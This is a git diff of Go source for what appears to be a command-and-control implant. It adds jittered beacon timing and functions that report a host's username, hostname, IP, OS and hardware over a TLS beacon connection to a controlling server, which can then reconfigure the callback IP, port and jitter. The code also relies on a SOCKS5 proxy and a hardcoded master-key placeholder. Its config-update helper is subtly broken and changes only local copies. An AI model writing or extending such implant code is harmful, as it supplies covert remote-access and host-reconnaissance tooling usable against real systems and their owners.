@@ -132,6 +132,7 @@ func HandleError(beacon *tls.Conn, reqType string, err error) {
 }
 
 func CalculateSleepInterval(CallbackFrequency string, CallbackJitter string) float64 {
+	// DEPRECATED - USE CalculateNextCallbackTime
 	r := rand.New(rand.NewSource(time.Now().UnixNano()))
 	frequency, _ := strconv.Atoi(CallbackFrequency)
 	jitter, _ := strconv.Atoi(CallbackJitter)
@@ -139,6 +140,20 @@ func CalculateSleepInterval(CallbackFrequency string, CallbackJitter string) flo
 	baseTime := float64(frequency)
 	variance := baseTime * jitterPercent * r.Float64()
 	return baseTime - (jitterPercent * baseTime) + 2*variance
+}
+
+func CalculateNextCallbackTime(callbackFrequency string, callbackJitter string) time.Time {
+	r := rand.New(rand.NewSource(time.Now().UnixNano()))
+	frequency, _ := strconv.Atoi(callbackFrequency)
+	jitter, _ := strconv.Atoi(callbackJitter)
+
+	baseTime := float64(frequency)
+	jitterPercent := float64(jitter) * 0.01
+	variance := baseTime * jitterPercent * r.Float64()
+
+	finalInterval := baseTime - (jitterPercent * baseTime) + 2*variance
+
+	return time.Now().UTC().Add(time.Duration(finalInterval * float64(time.Second)))
 }
 
 func GetOSInfo() (string, string, string, string, string) {
@@ -275,4 +290,61 @@ func (p *ProxyServer) StopProxy() {
 	p.listener.Close()
 	p.wg.Wait()
 	logger.Logf(logger.Info, "SOCKS5 proxy server stopped.")
+}
+
+func HandleConfigurationRequest(beacon *tls.Conn, encoder *gob.Encoder, decoder *gob.Decoder, agentID, hostname, username, ip, osType, osArch, osVersion, cpus, memory, ServerIP, ServerPort, CallbackFrequency, CallbackJitter string, nextCallback time.Time) error {
+	configReq := CreateConfigurationRequest(agentID, hostname, osType, osArch, osVersion, cpus, memory, username, ip, ServerIP, ServerPort, CallbackFrequency, CallbackJitter, nextCallback)
+	if err := SendRequest(encoder, types.ConfigurationRequestType, configReq); err != nil {
+		return err
+	}
+
+	var response types.Response
+	if err := decoder.Decode(&response); err != nil {
+		return err
+	}
+
+	if response.Type == types.ConfigurationResponseType {
+		if configResponse, ok := response.Payload.(types.ConfigurationResponse); ok {
+			UpdateClientConfig(configResponse, ServerIP, ServerPort, CallbackFrequency, CallbackJitter)
+		} else {
+			return fmt.Errorf("unexpected payload type")
+		}
+	} else {
+		return fmt.Errorf("unexpected response type: %v", response.Type)
+	}
+	return nil
+}
+
+func CreateConfigurationRequest(agentID, hostname, osType, osArch, osVersion, cpus, memory, username, ip, ServerIP, ServerPort, CallbackFrequency, CallbackJitter string, nextCallback time.Time) types.ConfigurationRequest {
+	return types.ConfigurationRequest{
+		AgentID:           agentID,
+		Username:          username,
+		Hostname:          hostname,
+		OSType:            osType,
+		OSArch:            osArch,
+		OSBuild:           osVersion,
+		CPUS:              cpus,
+		MEMORY:            memory,
+		AgentIP:           ip,
+		ServerIP:          ServerIP,
+		ServerPort:        ServerPort,
+		CallbackFrequency: CallbackFrequency,
+		CallbackJitter:    CallbackJitter,
+		NextCallback:      nextCallback,
+		MasterKey:         "MASTERKEY",
+	}
+}
+
+func UpdateClientConfig(config types.ConfigurationResponse, ServerIP, ServerPort, CallbackFrequency, CallbackJitter string) {
+	UpdateConfigField(&ServerIP, config.ServerIP, "callback IP")
+	UpdateConfigField(&ServerPort, config.ServerPort, "callback port")
+	UpdateConfigField(&CallbackFrequency, config.CallbackFrequency, "callback frequency")
+	UpdateConfigField(&CallbackJitter, config.CallbackJitter, "callback jitter")
+}
+
+func UpdateConfigField(current *string, new, fieldName string) {
+	if *current != new {
+		logger.Logf(logger.Info, "Updating %s", fieldName)
+		*current = new
+	}
 }
